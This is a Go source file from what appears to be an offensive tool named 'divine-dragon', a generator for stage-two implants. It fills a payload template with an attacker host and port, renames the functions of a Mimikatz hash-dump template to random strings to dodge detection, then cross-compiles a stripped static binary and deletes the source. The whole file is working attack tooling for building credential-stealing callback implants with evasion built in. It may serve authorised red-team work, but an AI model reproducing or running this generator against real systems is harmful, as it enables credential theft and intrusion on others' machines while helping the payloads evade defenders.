package payload_generator

import (
	"divine-dragon/util"
	"fmt"
	"os/exec"
	"strings"

	"github.com/gobuffalo/packr"
)

type StageTwoPayloadGeneratorModule struct {
	host           string
	port           string
	payloadType    string
	platform       string
	arch           string
	executableName string

	logger util.Logger
}

func NewStageTwoPayloadGeneratorModule(hostOpt string, portOpt string, payloadTypeOpt string, platformOpt string, archOpt string, executableNameOpt string) *StageTwoPayloadGeneratorModule {
	stpgm := StageTwoPayloadGeneratorModule{
		host:           hostOpt,
		port:           portOpt,
		payloadType:    payloadTypeOpt,
		platform:       platformOpt,
		arch:           archOpt,
		executableName: executableNameOpt,
	}
	stpgm.logger = util.StageTwoPayloadGeneratorLogger(true, "")
	return &stpgm
}

func (stpgm *StageTwoPayloadGeneratorModule) Run() {
	payloadSource, err := stpgm.preparePayloadSource()
	if err != nil {
		stpgm.logger.Log.Error(err)
	}
	stpgm.logger.Log.Noticef("Your payload was generated in file %s:", stpgm.payloadType+".exe")
	stpgm.logger.Log.Noticef("See the source code below:\n%s", payloadSource)
	err = stpgm.compilePayload(payloadSource)
	if err != nil {
		stpgm.logger.Log.Error(err)
	}
}

func (stpgm *StageTwoPayloadGeneratorModule) preparePayloadSource() (string, error) {
	payloadSource, err := packr.NewBox("./templates/").FindString(stpgm.payloadType + ".go")
	if err != nil {
		return "", fmt.Errorf("can't get template from templates/ folder: %v", err)
	}
	payloadSource = strings.Replace(payloadSource, "HOST", stpgm.host, -1)
	payloadSource = strings.Replace(payloadSource, "PORT", stpgm.port, -1)
	var funcPatterns []string
	if stpgm.payloadType == "mimikatz_hashdump" {
		funcPatterns = []string{
			"RUNMIMIKATZ",
			"GETHELPER",
			"MIMIKATZFILENAME",
			"WRITEMIMIKATZFILETOTEMPDIR",
		}
	}
	for _, funcPattern := range funcPatterns {
		payloadSource = strings.Replace(payloadSource, funcPattern, util.RandString(util.RandInt()), -1)
	}
	return payloadSource, nil
}

func (stpgm *StageTwoPayloadGeneratorModule) compilePayload(payloadSource string) error {
	payloadSourceFileName := util.RandString(util.RandInt()) + ".go"
	err := util.WriteToFile(payloadSourceFileName, payloadSource)
	if err != nil {
		return err
	}
	out, err := exec.Command("env",
		fmt.Sprintf("GOOS=%s", stpgm.platform),
		fmt.Sprintf("GOARCH=%s", stpgm.arch),
		"go",
		"build",
		"-o",
		stpgm.executableName,
		"-ldflags",
		"-w -s -extldflags=-static",
		payloadSourceFileName).Output()
	if err != nil {
		return err
	}
	if string(out) != "" {
		return fmt.Errorf("can't compile a binary: %s", string(out))
	}
	err = util.RemoveFile(payloadSourceFileName)
	if err != nil {
		return fmt.Errorf("can't delete a file %s: %v", payloadSourceFileName, err)
	}
	return nil
}
